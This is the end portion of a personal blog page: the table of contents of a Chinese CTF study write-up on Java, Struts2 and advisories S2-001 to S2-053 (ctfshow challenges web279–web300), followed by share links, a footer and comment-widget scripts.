+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Java%E5%85%A5%E9%97%A8%E7%AC%94%E8%AE%B0"><span class="toc-number">1.</span> <span class="toc-text">Java入门笔记</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Java%E4%BB%8E%E6%BA%90%E4%BB%A3%E7%A0%81%E5%88%B0%E8%BF%90%E8%A1%8C"><span class="toc-number">1.1.</span> <span class="toc-text">Java从源代码到运行</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%B8%B8%E8%A7%81%E7%9A%84Java-Web%E6%A1%86%E6%9E%B6"><span class="toc-number">1.2.</span> <span class="toc-text">常见的Java Web框架</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Struts2-%E6%A1%86%E6%9E%B6"><span class="toc-number">1.3.</span> <span class="toc-text">Struts2 框架</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Struts2-%E7%9B%AE%E5%BD%95%E7%BB%93%E6%9E%84"><span class="toc-number">1.3.1.</span> <span class="toc-text">Struts2 目录结构</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Struts2-%E4%B8%9A%E5%8A%A1%E9%80%BB%E8%BE%91"><span class="toc-number">1.3.2.</span> <span class="toc-text">Struts2 业务逻辑</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Struts2-Action%E7%B1%BB"><span class="toc-number">1.3.3.</span> <span class="toc-text">Struts2 Action类</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web-xml"><span class="toc-number">1.3.4.</span> <span class="toc-text">web.xml</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BB%80%E4%B9%88%E6%98%AFServlet"><span class="toc-number">1.4.</span> <span class="toc-text">什么是Servlet</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web279-S2-001"><span class="toc-number">1.5.</span> <span class="toc-text">web279 - S2-001</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Ognl%E8%A1%A8%E8%BE%BE%E5%BC%8F"><span class="toc-number">1.5.1.</span> <span class="toc-text">Ognl表达式</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web280-S2-005"><span class="toc-number">1.6.</span> <span class="toc-text">web280 - S2-005</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web281-S2-007"><span class="toc-number">1.7.</span> <span class="toc-text">web281 - S2-007</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A4%E6%96%ADS2-007"><span class="toc-number">1.7.1.</span> <span class="toc-text">判断S2-007</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%A7%A3%E6%9E%90payload"><span class="toc-number">1.7.2.</span> <span class="toc-text">解析payload</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BB%80%E4%B9%88%E6%98%AF-%EF%BC%9F"><span class="toc-number">1.7.3.</span> <span class="toc-text">什么是@？</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%B3%A8%E8%A7%A3%EF%BC%88Annotations%EF%BC%89"><span class="toc-number">1.7.3.1.</span> <span class="toc-text">注解（Annotations）</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%94%A8%E4%BA%8ELambda%E8%A1%A8%E8%BE%BE%E5%BC%8F"><span class="toc-number">1.7.3.2.</span> <span class="toc-text">@用于Lambda表达式</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BB%80%E4%B9%88%E6%98%AFJava-Lambda%E8%A1%A8%E8%BE%BE%E5%BC%8F%EF%BC%9F"><span class="toc-number">1.7.3.3.</span> <span class="toc-text">什么是Java Lambda表达式？</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web282-S2-008"><span class="toc-number">1.8.</span> <span class="toc-text">web282 - S2-008</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web283-S2-009"><span class="toc-number">1.9.</span> <span class="toc-text">web283 - S2-009</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web284-S2-012"><span class="toc-number">1.10.</span> <span class="toc-text">web284 - S2-012</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web285-S2-013-S2-014"><span class="toc-number">1.11.</span> <span class="toc-text">web285 - S2-013&#x2F;S2-014</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web286-S2-015"><span class="toc-number">1.12.</span> <span class="toc-text">web286 - S2-015</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web287-S2-016"><span class="toc-number">1.13.</span> <span class="toc-text">web287 - S2-016</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web288-S2-019"><span class="toc-number">1.14.</span> <span class="toc-text">web288 - S2-019</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web289-S2-032"><span class="toc-number">1.15.</span> <span class="toc-text">web289 - S2-032</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web290-S2-032"><span class="toc-number">1.16.</span> <span class="toc-text">web290 - S2-032?</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web291-S2-033"><span class="toc-number">1.17.</span> <span class="toc-text">web291 - S2-033</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web292-S2-037"><span class="toc-number">1.18.</span> <span class="toc-text">web292 - S2-037</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web293-S2-045"><span class="toc-number">1.19.</span> <span class="toc-text">web293 - S2-045</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web294-S2-046"><span class="toc-number">1.20.</span> <span class="toc-text">web294 - S2-046</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web295-S2-048"><span class="toc-number">1.21.</span> <span class="toc-text">web295 - S2-048</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web296-S2-052"><span class="toc-number">1.22.</span> <span class="toc-text">web296 - S2-052</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web297-S2-053"><span class="toc-number">1.23.</span> <span class="toc-text">web297 - S2-053</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web298-%E4%B8%80%E4%B8%AAServlet"><span class="toc-number">1.24.</span> <span class="toc-text">web298 - 一个Servlet</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web299"><span class="toc-number">1.25.</span> <span class="toc-text">web299</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web300-PHP%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB"><span class="toc-number">1.26.</span> <span class="toc-text">web300 - PHP文件包含</span></a></li></ol></li></ol>
+      </div>
+    
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://example.com/2024/05/05/ctfshow-web%E5%85%A5%E9%97%A8%E7%AC%94%E8%AE%B0-Java%E5%85%A5%E9%97%A8/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://example.com/2024/05/05/ctfshow-web%E5%85%A5%E9%97%A8%E7%AC%94%E8%AE%B0-Java%E5%85%A5%E9%97%A8/&text=ctfshow-web入门笔记-Java入门"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://example.com/2024/05/05/ctfshow-web%E5%85%A5%E9%97%A8%E7%AC%94%E8%AE%B0-Java%E5%85%A5%E9%97%A8/&title=ctfshow-web入门笔记-Java入门"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://example.com/2024/05/05/ctfshow-web%E5%85%A5%E9%97%A8%E7%AC%94%E8%AE%B0-Java%E5%85%A5%E9%97%A8/&is_video=false&description=ctfshow-web入门笔记-Java入门"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=ctfshow-web入门笔记-Java入门&body=Check out this article: http://example.com/2024/05/05/ctfshow-web%E5%85%A5%E9%97%A8%E7%AC%94%E8%AE%B0-Java%E5%85%A5%E9%97%A8/"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://example.com/2024/05/05/ctfshow-web%E5%85%A5%E9%97%A8%E7%AC%94%E8%AE%B0-Java%E5%85%A5%E9%97%A8/&title=ctfshow-web入门笔记-Java入门"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://example.com/2024/05/05/ctfshow-web%E5%85%A5%E9%97%A8%E7%AC%94%E8%AE%B0-Java%E5%85%A5%E9%97%A8/&title=ctfshow-web入门笔记-Java入门"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://example.com/2024/05/05/ctfshow-web%E5%85%A5%E9%97%A8%E7%AC%94%E8%AE%B0-Java%E5%85%A5%E9%97%A8/&title=ctfshow-web入门笔记-Java入门"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://example.com/2024/05/05/ctfshow-web%E5%85%A5%E9%97%A8%E7%AC%94%E8%AE%B0-Java%E5%85%A5%E9%97%A8/&title=ctfshow-web入门笔记-Java入门"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://example.com/2024/05/05/ctfshow-web%E5%85%A5%E9%97%A8%E7%AC%94%E8%AE%B0-Java%E5%85%A5%E9%97%A8/&name=ctfshow-web入门笔记-Java入门&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://example.com/2024/05/05/ctfshow-web%E5%85%A5%E9%97%A8%E7%AC%94%E8%AE%B0-Java%E5%85%A5%E9%97%A8/&t=ctfshow-web入门笔记-Java入门"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+        
+          <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa-solid fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2021-2024
+    ShuiChang
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/tags/">tags</a></li><!--
+     --><!--
+       --><li><a href="/friends/">friends</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     --><!--
+       --><li><a target="_blank" rel="noopener" href="https://github.com/ShuiChang2019">Projects</a></li><!--
+     -->
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script>
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script>
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
+    btn += '<i class="fa-regular fa-clone"></i>';
+    btn += '</span>';
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "Copied!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Disqus Comments -->
+
+<!-- utterances Comments -->
+
+    <script type="text/javascript">
+      var utterances_repo = 'ShuiChang2019/Utterance_comments_try';
+      var utterances_issue_term = 'pathname';
+      var utterances_label = 'Comment';
+      var utterances_theme = 'github-dark';
+
+      (function(){
+          var script = document.createElement('script');
+
+          script.src = 'https://utteranc.es/client.js';
+          script.setAttribute('repo', utterances_repo);
+          script.setAttribute('issue-term', 'pathname');
+          script.setAttribute('label', utterances_label);
+          script.setAttribute('theme', utterances_theme);
+          script.setAttribute('crossorigin', 'anonymous');
+          script.async = true;
+          (document.getElementById('utterances_thread')).appendChild(script);
+      }());
+  </script>
+
+</body>
+</html>
